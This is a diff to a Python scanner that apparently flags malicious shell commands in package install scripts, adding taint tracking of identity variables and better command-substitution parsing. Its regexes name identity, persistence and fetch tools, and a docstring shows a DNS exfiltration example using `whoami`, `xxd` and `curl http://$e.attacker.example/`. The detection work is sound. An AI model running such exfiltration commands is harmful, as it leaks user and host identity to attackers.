@@ -25,6 +25,23 @@ DECODERS = {"base64", "base32", "xxd", "openssl", "gunzip", "zcat", "rev", "uude
 SYSINFO_SUB = re.compile(r"\$\(\s*(whoami|hostname|id|uname|pwd|curl\s+[^)]*ip|ifconfig|ip\s+a)[^)]*\)|`\s*(whoami|hostname|id|uname|pwd)[^`]*`"
                          r"|\$\{?(USER|USERNAME|HOSTNAME|HOME|PWD|LOGNAME)\b\}?|%(USERNAME|COMPUTERNAME|USERDOMAIN|USERPROFILE)%"
                          r"|\$env:(USERNAME|COMPUTERNAME|USERDOMAIN)|\[Environment\]::(UserName|MachineName)", re.I)
+# an identity program anywhere inside a command substitution: $(sh -c 'hostname -I | awk ...'), $(id -un)
+SYSINFO_IN_SUB = re.compile(r"\$\([^()]*(\([^()]*\)[^()]*)*\b(whoami|hostname|uname|id|ifconfig|ipconfig|systeminfo)\b", re.I)
+ASSIGN = re.compile(r"^(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)*)?([A-Za-z_]\w*)=(.*)$", re.S)
+FOR_IN = re.compile(r"^for\s+([A-Za-z_]\w*)\s+in\s+(.*)$", re.S)
+READ_FROM = re.compile(r"^read\s+(?:-\w+\s+)*([A-Za-z_]\w*)\s*<<<\s*(.*)$", re.S)
+KEYWORDS = ("do", "then", "else", "elif", "if", "while", "until", "{", "(", "!")
+
+
+def _refs(text: str, names: set) -> bool:
+    """Does the text use one of these shell variables ($x, ${x}, ${x:0:63}, ${x[@]})?"""
+    return any(re.search(r"\$\{?" + re.escape(n) + r"\b", text) for n in names)
+
+
+def _identity(text: str, tainted: set) -> bool:
+    return bool(SYSINFO_SUB.search(text) or SYSINFO_IN_SUB.search(text) or (tainted and _refs(text, tainted)))
+
+
 WHOLE_ENV = re.compile(r"^(env|printenv|set|get-childitem\s+env:|gci\s+env:|dir\s+env:)\b", re.I)
 PERSIST_CMD = {"crontab", "schtasks", "schtasks.exe", "launchctl", "systemctl", "reg", "reg.exe", "new-itemproperty",
                "set-itemproperty", "new-scheduledtask", "register-scheduledtask"}
@@ -32,16 +49,39 @@ URL = re.compile(r"(?:https?|ftp)://[^\s'\"<>|;)]+|\b\d{1,3}(?:\.\d{1,3}){3}(?::
 
 
 def _split_commands(text: str) -> list[list[str]]:
-    """[[simple command, ... (a pipeline)], ...] - quotes respected roughly; never raises."""
+    """[[simple command, ... (a pipeline)], ...] - quotes and $( ) / backtick substitutions respected roughly (what is
+    inside a substitution stays with its command, also inside double quotes); never raises."""
     out, cur_pipe, buf, q, i = [], [], [], None, 0
+    stack: list = []                         # open substitutions: (quote outside it, "$(" or "`")
     while i < len(text):
         ch = text[i]
-        if q:
+        if q == "'":
             buf.append(ch)
-            if ch == q and (q == "'" or text[i - 1] != "\\"):
+            if ch == "'":
+                q = None
+        elif text[i:i + 2] == "$(":
+            stack.append((q, "$("))
+            q = None
+            buf.append("$(")
+            i += 1
+        elif ch == "`":
+            if stack and stack[-1][1] == "`" and q is None:
+                q = stack.pop()[0]
+            else:
+                stack.append((q, "`"))
+                q = None
+            buf.append(ch)
+        elif ch == ")" and q is None and stack and stack[-1][1] == "$(":
+            q = stack.pop()[0]
+            buf.append(ch)
+        elif q == '"':
+            buf.append(ch)
+            if ch == '"' and text[i - 1] != "\\":
                 q = None
         elif ch in "'\"":
             q = ch
+            buf.append(ch)
+        elif stack:
             buf.append(ch)
         elif ch == "|" and text[i:i + 2] != "||":
             cur_pipe.append("".join(buf).strip())
@@ -70,7 +110,7 @@ def _argv(cmd: str) -> list[str]:
 def _prog(argv: list[str]) -> str:
     i = 0
     while i < len(argv) and (re.match(r"^\w+=", argv[i]) or argv[i] in ("sudo", "nohup", "exec", "env", "time", "start", "&",
-                                                                          "call", "-b", "/b", "/min")):
+                                                                          "call", "-b", "/b", "/min") + KEYWORDS):
         i += 1
     p = argv[i] if i < len(argv) else ""
     return p.replace("\\", "/").rsplit("/", 1)[-1].lower() if not p.startswith("./") else p
@@ -112,10 +152,14 @@ def _ps_code(argv: list[str]) -> str | None:
     return None
 
 
-def analyze(text: str, ctx, phase: str, file: str, line: int, depth: int = 0) -> dict:
+def analyze(text: str, ctx, phase: str, file: str, line: int, depth: int = 0, tainted: set | None = None) -> dict:
     """Facts of one command line into ctx (behavior.Context). Returns {"programs": [...], "sysinfo": bool,
-    "network": bool} so a caller (Python's check_output, a JS execSync) can taint what the command prints."""
+    "network": bool} so a caller (Python's check_output, a JS execSync) can taint what the command prints.
+    `tainted`: shell variables that hold identity values (user, host, path) - set by `u=$(whoami)`, carried through
+    `e=$(echo "$u" | xxd -p)`, `for x in "$u" ...` and `read -a p <<< "$u"`; a fetcher or DNS tool that uses one sends
+    that identity out (DNS exfiltration: `curl http://$e.attacker.example/`)."""
     pol = policy()
+    tainted = set() if tainted is None else tainted
     info = {"programs": [], "sysinfo": False, "network": False}
     if not isinstance(text, str) or not text.strip() or depth > pol.limits["max_depth"]:
         return info
@@ -136,6 +180,11 @@ def analyze(text: str, ctx, phase: str, file: str, line: int, depth: int = 0) ->
         decoded = False
         secret_in = False
         for k, cmd in enumerate(pipeline):
+            bare = re.sub(r"^(?:(?:do|then|else|elif|if|while|until|\{|\(|!)\s+)+", "", cmd.strip())
+            for rx in (ASSIGN, FOR_IN, READ_FROM):
+                m = rx.match(bare)
+                if m and _identity(m.group(2), tainted):
+                    tainted.add(m.group(1))
             argv = _argv(cmd)
             if not argv:
                 continue
@@ -150,7 +199,7 @@ def analyze(text: str, ctx, phase: str, file: str, line: int, depth: int = 0) ->
             if prog in FETCH or (prog.startswith(("powershell", "pwsh")) and re.search(r"net\.webclient|invoke-webrequest|iwr|downloadstring", cmd_low)):
                 info["network"] = True
                 urls = URL.findall(cmd)
-                payload = SYSINFO_SUB.search(cmd) is not None
+                payload = _identity(cmd, tainted)
                 sends_file = re.search(r"(-d|--data(-binary|-raw)?|-F|--form|-T|--upload-file)\s+['\"]?[^'\"]*@([^\s'\"]+)", cmd)
                 if sends_file and path_class(sends_file.group(3)) == "credential" or (k > 0 and secret_in):
                     ctx.emit("secret_exfil", phase, file, line, " | ".join(pipeline))
@@ -171,7 +220,7 @@ def analyze(text: str, ctx, phase: str, file: str, line: int, depth: int = 0) ->
                     ctx.emit("secret_exfil", phase, file, line, " | ".join(pipeline))
                 fetched = True
             elif prog in DNS:
-                if SYSINFO_SUB.search(cmd):
+                if _identity(cmd, tainted):
                     ctx.emit("sysinfo_beacon", phase, file, line, cmd)
             elif prog in DECODERS and re.search(r"(^|\s)(-d|--decode|-D|-r)\b|\benc\s+-d\b", cmd) or prog in ("rev",):
                 decoded = True
@@ -222,9 +271,15 @@ def analyze(text: str, ctx, phase: str, file: str, line: int, depth: int = 0) ->
             if prog in ("sh", "bash", "zsh", "dash") and "-c" in argv:
                 code = argv[argv.index("-c") + 1] if argv.index("-c") + 1 < len(argv) else ""
                 if code and code != text:
-                    analyze(code, ctx, phase, file, line, depth + 1)
+                    analyze(code, ctx, phase, file, line, depth + 1, tainted)
             if prog.startswith("python") and "-c" in argv and argv.index("-c") + 1 < len(argv):
                 ctx.nested_python(argv[argv.index("-c") + 1], phase, file, line, depth + 1)
+            # an interpreter started on one of the package's files: that file runs at this phase too
+            if (prog in ("node", "nodejs", "bun", "deno", "sh", "bash", "zsh", "dash") or prog.startswith("python")) \
+                    and not {"-e", "--eval", "-c", "-m", "-p", "--print"} & set(argv[1:]):
+                script = next((a for a in argv[1:] if not a.startswith("-")), None)
+                if script and hasattr(ctx, "run_script"):
+                    ctx.run_script(script, prog, phase, file)
             if prog in ("node", "bun", "deno") and ("-e" in argv or "--eval" in argv):
                 flag = "-e" if "-e" in argv else "--eval"
                 if argv.index(flag) + 1 < len(argv):
